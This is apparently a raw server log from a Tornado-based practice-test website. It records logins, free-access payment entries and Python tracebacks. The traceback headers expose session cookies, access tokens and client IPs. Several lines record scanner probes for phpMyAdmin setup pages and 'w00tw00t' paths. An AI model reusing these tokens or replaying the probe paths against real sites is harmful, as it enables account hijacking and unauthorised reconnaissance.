Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
Error while redirecting user with id 507ff6b78e4c8511b8b72af1 to PayPal: ValidationError(StringField only accepts string values: ['price'])
WARNING:intheory-8000:Error while redirecting user with id 507ff6b78e4c8511b8b72af1 to PayPal: ValidationError(StringField only accepts string values: ['price'])
ERROR:root:Uncaught exception GET /payment/redirect?code=H15W4NDS&_xsrf=71317e53913c46ca8bdb7146036d3aa3 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/payment/redirect?code=H15W4NDS&_xsrf=71317e53913c46ca8bdb7146036d3aa3', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/payment', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=71317e53913c46ca8bdb7146036d3aa3; access_token="SmVycnk=|1350563695|9f1b5d96b201ed7443a70c8b298ee93133ce8137"; user_type="aW50aGVvcnk=|1350563695|43cd3fc333592516b373c7908681b75b7e2b700e"'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 2 arguments (1 given)
ERROR:root:500 GET /payment/redirect?code=H15W4NDS&_xsrf=71317e53913c46ca8bdb7146036d3aa3 (127.0.0.1) 51.44ms
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
User with id 507ff8e28e4c8515033278d1has paid. The transaction id is Free voucher transaction
INFO:intheory-8002:User with id 507ff8e28e4c8515033278d1has paid. The transaction id is Free voucher transaction
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Error while fetching new question: None is not a valid ObjectId
WARNING:intheory-8001:Error while fetching new question: None is not a valid ObjectId
ERROR:root:Uncaught exception GET /test/get-next?cursor=50&timer_over=true&_xsrf=af45aed4f5eb4757bd258984f206cc3f (127.0.0.1)
HTTPRequest(protocol='http', host='intheory.co.uk', method='GET', uri='/test/get-next?cursor=50&timer_over=true&_xsrf=af45aed4f5eb4757bd258984f206cc3f', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'el-gr,el;q=0.8,en-us;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://intheory.co.uk/test/new?sid=5079703f8e4c853d825c854d', 'X-Real-Ip': '62.228.208.114', 'Cookie': '_xsrf=af45aed4f5eb4757bd258984f206cc3f; __utma=188782963.1161692382.1350568641.1350568641.1350568641.1; __utmc=188782963; __utmz=188782963.1350568641.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="UGFtYm9zZQ==|1350568733|4cd6eeb5bd56ab670ba6a413aef1e328fc24f338"; user_type="aW50aGVvcnk=|1350568733|3edbe756b2c9bf0bec70253aaaf33f443eaed9a0"'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 GET /test/get-next?cursor=50&timer_over=true&_xsrf=af45aed4f5eb4757bd258984f206cc3f (127.0.0.1) 12.86ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Error while fetching new question: None is not a valid ObjectId
WARNING:intheory-8000:Error while fetching new question: None is not a valid ObjectId
ERROR:root:Uncaught exception GET /test/get-next?cursor=50&timer_over=true&_xsrf=af45aed4f5eb4757bd258984f206cc3f (127.0.0.1)
HTTPRequest(protocol='http', host='intheory.co.uk', method='GET', uri='/test/get-next?cursor=50&timer_over=true&_xsrf=af45aed4f5eb4757bd258984f206cc3f', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'el-gr,el;q=0.8,en-us;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://intheory.co.uk/test/new?sid=5079703f8e4c853d825c854d', 'X-Real-Ip': '62.228.208.114', 'Cookie': '_xsrf=af45aed4f5eb4757bd258984f206cc3f; __utma=188782963.1161692382.1350568641.1350568641.1350568641.1; __utmc=188782963; __utmz=188782963.1350568641.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="UGFtYm9zZQ==|1350568733|4cd6eeb5bd56ab670ba6a413aef1e328fc24f338"; user_type="aW50aGVvcnk=|1350568733|3edbe756b2c9bf0bec70253aaaf33f443eaed9a0"'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 GET /test/get-next?cursor=50&timer_over=true&_xsrf=af45aed4f5eb4757bd258984f206cc3f (127.0.0.1) 13.03ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348059227.1349702875.4; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 15.72ms
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8000:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.81ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.27ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
User with id 508087cd8e4c85150efb936dhas paid. The transaction id is Free voucher transaction
INFO:intheory-8001:User with id 508087cd8e4c85150efb936dhas paid. The transaction id is Free voucher transaction
WARNING:root:404 GET /w00tw00t.at.blackhats.romanian.anti-sec:) (127.0.0.1) 1.16ms
WARNING:root:404 GET /phpMyAdmin/scripts/setup.php (127.0.0.1) 1.30ms
WARNING:root:404 GET /phpmyadmin/scripts/setup.php (127.0.0.1) 1.17ms
WARNING:root:404 GET /pma/scripts/setup.php (127.0.0.1) 1.17ms
WARNING:root:404 GET /myadmin/scripts/setup.php (127.0.0.1) 1.13ms
WARNING:root:404 GET /MyAdmin/scripts/setup.php (127.0.0.1) 1.14ms
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
HTTP 405: Method Not Allowed
ERROR:intheory-8002:HTTP 405: Method Not Allowed
WARNING:root:405 GET /login/intheory (127.0.0.1) 5.31ms
WARNING:root:404 GET /w00tw00t.at.blackhats.romanian.anti-sec:) (127.0.0.1) 0.85ms
WARNING:root:404 GET /phpMyAdmin/scripts/setup.php (127.0.0.1) 1.15ms
WARNING:root:404 GET /phpmyadmin/scripts/setup.php (127.0.0.1) 1.12ms
WARNING:root:404 GET /pma/scripts/setup.php (127.0.0.1) 1.11ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (84.241.100.26) 0.39ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
User with id 506f11498e4c856632c26f44has paid. The transaction id is Granted free access by moderator
INFO:intheory-8002:User with id 506f11498e4c856632c26f44has paid. The transaction id is Granted free access by moderator
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 4.57ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.41ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.21ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 0.71ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.20ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.33ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.31ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.21ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.20ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.29ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.20ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.19ms
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Facebook user with id 5076b5b38e4c850ee2828b57 has successfully logged in.
INFO:intheory-8000:Facebook user with id 5076b5b38e4c850ee2828b57 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 5076b5b38e4c850ee2828b57 has successfully logged in.
INFO:intheory-8002:Facebook user with id 5076b5b38e4c850ee2828b57 has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Error while fetching new question: None is not a valid ObjectId
WARNING:intheory-8001:Error while fetching new question: None is not a valid ObjectId
ERROR:root:Uncaught exception GET /test/get-next?cursor=50&timer_over=true&_xsrf=2079eabd37e64d37934f837c3383dbca (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/test/get-next?cursor=50&timer_over=true&_xsrf=2079eabd37e64d37934f837c3383dbca', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new?sid=5079703f8e4c853d825c854d', 'X-Real-Ip': '95.148.247.230', 'Cookie': '_xsrf=2079eabd37e64d37934f837c3383dbca; access_token=QUFBRzZsTmNzNkdjQkFHaTRuWFJpU3dNR0pqeEpjVzh5Q0lhZVQ4THJ3ejhYWDNJcTROekZzWkJUZTZKemVwalpBNmN6WVpDdEpFSmloemwxVjlYNTBiVkQwQ1ZYTVNZWkN2REE4OHl6VndaRFpE|1350673307|1a8b49ea633fede45258329539c3d7dcdb37f59e; user_type="ZmI=|1350673307|088756573dbae872e96a83f4d50ccfe5e5b03b8f"; __utma=188782963.2050556126.1350670721.1350670721.1350670721.1; __utmc=188782963; __utmz=188782963.1350670721.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 GET /test/get-next?cursor=50&timer_over=true&_xsrf=2079eabd37e64d37934f837c3383dbca (127.0.0.1) 171.45ms
WARNING:root:405 HEAD / (127.0.0.1) 0.73ms
WARNING:root:405 HEAD / (127.0.0.1) 0.69ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 19.34ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 21.08ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.04ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 10.24ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.39ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 5082e4cb8e4c8514f431ea28 has successfully logged in.
INFO:intheory-8001:Facebook user with id 5082e4cb8e4c8514f431ea28 has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8000:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Facebook user with id 507db3118e4c854410a43c44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 507db3118e4c854410a43c44 has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (84.241.100.26) 0.79ms
Error while fetching new question: None is not a valid ObjectId
WARNING:intheory-8001:Error while fetching new question: None is not a valid ObjectId
ERROR:root:Uncaught exception GET /test/get-next?cursor=50&timer_over=true&_xsrf=3d23fdfc4b414736a0438f6877bbf9c4 (127.0.0.1)
